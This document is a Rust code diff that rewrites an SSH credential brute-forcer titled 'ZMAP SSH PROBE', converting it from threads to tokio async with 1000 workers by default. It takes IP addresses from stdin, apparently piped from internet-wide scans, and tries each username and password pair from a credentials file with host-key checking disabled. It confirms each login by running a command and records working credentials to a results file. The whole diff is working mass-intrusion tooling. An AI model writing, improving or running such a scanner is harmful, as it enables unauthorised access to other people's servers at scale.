@@ -1,15 +1,16 @@
 use clap::Parser;
 use colored::*;
-use ssh2::Session;
 use std::fs::OpenOptions;
-use std::io::Read;
 use std::io::{self, BufRead, BufWriter, Write};
-use std::net;
 use std::sync::atomic::{AtomicUsize, Ordering};
-use std::sync::mpsc;
-use std::sync::{Arc, Mutex};
-use std::thread;
+use tokio::sync::Mutex;
+use std::sync::Arc;
 use std::time::Duration;
+use async_ssh2_tokio::client::{Client, AuthMethod, ServerCheckMethod};
+use std::panic::AssertUnwindSafe;
+use tokio::io::AsyncBufReadExt;
+use futures::FutureExt;
+use tokio::time::timeout;
 
 static IMPORTED: AtomicUsize = AtomicUsize::new(0);
 static CHECKED: AtomicUsize = AtomicUsize::new(0);
@@ -30,24 +31,28 @@ struct Args {
     #[arg(short = 'o', long, default_value = "results.txt")]
     output_file: String,
 
-    /// Specifies the number of threads to use
-    #[arg(short = 't', long, default_value = "50")]
-    threads: usize,
+    /// Specifies the number of workers to use per thread
+    #[arg(short = 'w', long, default_value = "1000")]
+    workers: usize,
 }
 
-fn main() {
+// Hardcoded change to threads you want. 
+//This will split your workers, example 1000 workers and 10 threads will be 100 workers per thread.
+#[tokio::main(flavor = "multi_thread", worker_threads = 10)] 
+async fn main() {
     let args = Args::parse();
 
-    let (ip_tx, ip_rx) = mpsc::sync_channel(CHANNEL_SIZE);
-    let ip_rx = Arc::new(Mutex::new(ip_rx));
+    let (ip_tx, ip_rx) = tokio::sync::mpsc::channel(CHANNEL_SIZE);
+    let ip_rx = Arc::new(Mutex::new(ip_rx)); 
 
-    thread::spawn(|| {
+    // Print stats
+    tokio::task::spawn(async {
         println!("+-------------------------------------------+");
         println!("|             ZMAP SSH PROBE                |");
         println!("+-------------------------------------------+");
 
         loop {
-            thread::sleep(Duration::new(1, 0)); // Sleep for one second
+            tokio::time::sleep(Duration::from_secs(1)).await; // Sleep for one second
 
             // Read the atomic values
             let imported_count = IMPORTED.load(Ordering::Relaxed);
@@ -70,132 +75,109 @@ fn main() {
         }
     });
 
-    thread::spawn(move || {
-        let stdin = io::stdin();
-        for line in stdin.lock().lines() {
-            let ip = line.expect("Failed to read line");
-            ip_tx.send(ip).unwrap();
+    // Reading from stdin
+    let stdin_task = tokio::spawn(async move {
+        let mut stdin = tokio::io::BufReader::new(tokio::io::stdin());
+
+        let mut buffer = String::new();
+        while stdin.read_line(&mut buffer).await.expect("Failed to read line") > 0 {
+            ip_tx.send(buffer.trim().to_string()).await.expect("Failed to send IP");
             IMPORTED.fetch_add(1, Ordering::Relaxed);
+            buffer.clear();
         }
-        drop(ip_tx)
     });
 
     let credentials = load_credentials_file("credentials.txt");
-    const STACK_SIZE: usize = 6 * 1024 * 1024; // 6MB
 
-    let handles: Vec<_> = (0..args.threads)
-        .map(|_| {
-            let ip_rx = Arc::clone(&ip_rx);
-            let creds = credentials.clone();
-            let output_file = args.output_file.clone();
+    // Spawning and joining tasks
+    let tasks: Vec<_> = (0..args.workers).map(|_| {
+        let ip_rx = ip_rx.clone();
+        let creds = credentials.clone();
+        let output_file = args.output_file.clone();
 
-            std::thread::Builder::new()
-                .stack_size(STACK_SIZE)
-                .spawn(move || {
-                    loop {
-                        let received_ip;
-                        {
-                            let receiver = ip_rx.lock().unwrap();
-                            received_ip = receiver.recv();
-                        }
-
-                        match received_ip {
-                            Ok(ip) => {
-                                check_ssh_login(ip, args.port, creds.clone(), &output_file);
-                            }
-                            Err(_) => break, // Break loop when no more IPs
-                        }
+        tokio::spawn(async move {
+            loop {
+                let ip = {
+                    let mut rx = ip_rx.lock().await;
+                    match rx.recv().await {
+                        Some(ip) => ip,
+                        None => break,  // No more IPs to process
                     }
-                })
-                .unwrap()
+                };
+                check_ssh_login(ip, args.port, creds.clone(), &output_file).await;
+            }
         })
-        .collect();
+    }).collect();
 
-    // Wait for all threads to finish
-    for handle in handles {
-        handle.join().unwrap();
+    let _ = futures::future::join_all(tasks).await;
+    stdin_task.await.expect("stdin_task panicked");
+}
+
+async fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
+    CHECKED.fetch_add(1, Ordering::Relaxed);
+
+    for (username, password) in &credentials {
+        let target = (ip.as_str(), port);
+
+        let result = AssertUnwindSafe(check_single_credential(target, username, password, output_file, &ip))
+            .catch_unwind()
+            .await;
+
+        if let Err(_) = result {
+            //println!("Encountered an error while trying to connect to {}:{}. Treating as failed.", ip, port);
+            FAILED.fetch_add(1, Ordering::Relaxed);
+        }
     }
 }
 
+async fn check_single_credential(
+    target: (&str, u16),
+    username: &str,
+    password: &str,
+    output_file: &str,
+    ip: &str,
+) -> Result<(), ()> {
+    let auth_method = AuthMethod::with_password(password);
 
-fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
-    let timeout = 5_000; // milliseconds
-    CHECKED.fetch_add(1, Ordering::Relaxed);
+    let connect_result = timeout(Duration::from_secs(5), Client::connect(target, username, auth_method, ServerCheckMethod::NoCheck)).await;
+    
+    COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
 
-    let tcp_stream_result = net::TcpStream::connect((ip.as_str(), port));
-
-    match tcp_stream_result {
-        Ok(tcp_stream) => {
-            let mut session = match Session::new() {
-                Ok(session) => session,
-                Err(_) => {
-                    FAILED.fetch_add(1, Ordering::Relaxed);
-                    return;
-                }
-            };
-
-            session.set_tcp_stream(tcp_stream);
-            session.set_timeout(timeout);
-
-            if session.handshake().is_err() {
-                FAILED.fetch_add(1, Ordering::Relaxed);
-                return;
-            }
-
-            for (username, password) in &credentials {
-                COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
-
-                if session.userauth_password(username, password).is_ok() {
-                    let mut channel = match session.channel_session() {
-                        Ok(channel) => channel,
-                        Err(_) => {
-                            FAILED.fetch_add(1, Ordering::Relaxed);
-                            continue;
-                        }
-                    };
-
-                    if channel.exec("echo '.'").is_err() {
-                        FAILED.fetch_add(1, Ordering::Relaxed);
-                        continue;
-                    }
-
-                    // Read any potential output from the command
-                    let mut output = String::new();
-                    if let Err(_e) = channel.read_to_string(&mut output) {
-                        //println!! ("Error reading output for IP {} with username {}: {}", ip, username, e);
-                    }
-
-                    // Send EOF if needed
-                    channel.send_eof().unwrap_or_default();
-
-                    // Now, try to close the channel
-                    if let Err(_e) = channel.wait_close() {
-                        //println!! ("Channel close error for IP {} with username {}: {}", ip, username, e);
-                        FAILED.fetch_add(1, Ordering::Relaxed);
-                        continue;
-                    }
-
-                    if channel.exit_status().unwrap_or(-1) == 0 {
-                        session.disconnect(None, "Closing session", None).unwrap_or_default();
-                        write_successful_login_to_file(output_file, &ip, username, password);
+    match connect_result {
+        Ok(Ok(client)) => {
+            match client.execute("echo .").await {
+                Ok(result) => {
+                    if result.exit_status == 0 {
                         SUCCESS.fetch_add(1, Ordering::Relaxed);
-                        break;
+                        write_successful_login_to_file(output_file, ip, username, password).await;
                     } else {
                         FAILED.fetch_add(1, Ordering::Relaxed);
                     }
-                } else {
+                },
+                Err(_err) => {
+                    //eprintln!("Error executing command on {}: {}", ip, err);
                     FAILED.fetch_add(1, Ordering::Relaxed);
-                }
+                },
             }
         },
-        Err(e) => {
-            if e.to_string().contains("timeout") {
-                TIMEOUTS.fetch_add(1, Ordering::Relaxed);
-            } else {
-                FAILED.fetch_add(1, Ordering::Relaxed);
-            }
-        }
+        Ok(Err(err)) if err.to_string().contains("timeout") => {
+            //eprintln!("Connection to {} timed out", ip);
+            TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+            return Err(());
+        },
+        Ok(Err(_err)) => {
+            //eprintln!("Error connecting to {}: {}", ip, err);
+            FAILED.fetch_add(1, Ordering::Relaxed);
+            return Err(());
+        },
+        Err(_) => {
+            //eprintln!("Connection to {} timed out", ip);
+            TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+            return Err(());
+        },
     }
+
+    Ok(())
 }
 
 fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
@@ -216,7 +198,7 @@ fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
         .collect()
 }
 
-fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
+async fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
     let file = OpenOptions::new()
         .write(true)
         .append(true)
